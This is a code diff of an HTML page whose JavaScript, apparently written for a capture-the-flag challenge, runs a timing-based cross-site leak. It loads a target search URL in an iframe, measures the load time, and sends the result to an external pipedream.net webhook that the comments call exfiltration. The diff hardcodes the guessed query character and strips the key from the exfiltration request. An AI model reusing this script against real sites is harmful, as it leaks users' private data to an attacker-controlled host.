@@ -3,11 +3,11 @@
         <script>
             fetch("https://eo92jpwn05w7j5i.m.pipedream.net");
             // This function runs after the iframe loads and sends timing stats
-            function runTest(param) {
+            function runTest() {
                 // Wait for the iframe to load (~500ms)
                 setTimeout(() => {
                     // URL to load for the flag
-                    var url_to_load = 'http://125.138.133.213:44444/search?query=' + param;
+                    var url_to_load = 'http://125.138.133.213:44444/search?query=S';
 
                     // Webhook URL to report (exfiltration)
                     var wh_url = 'https://eo92jpwn05w7j5i.m.pipedream.net';
@@ -26,7 +26,7 @@
                         var timing = end - start;
 
                         // Exfiltrate the load time for the iframe page
-                        fetch(wh_url + '/NO?status=200&time=' + timing + '&key=' + encodeURIComponent(param));
+                        fetch(wh_url + '/NO?status=200&time=' + timing);
 
                         // Optionally, you can remove the iframe after it's loaded
                         iframe.remove();
@@ -41,10 +41,10 @@
             document.body.appendChild(img);  // Append the image to the body
 
             // Run the test function with the desired query string
-            runTest("S");
+            runTest();
         </script>
     </head>
     <body>
-        <!-- The page content here -->ㅗㅑ
+        <!-- The page content here -->ㅗㅑㅅ
     </body>
 </html>
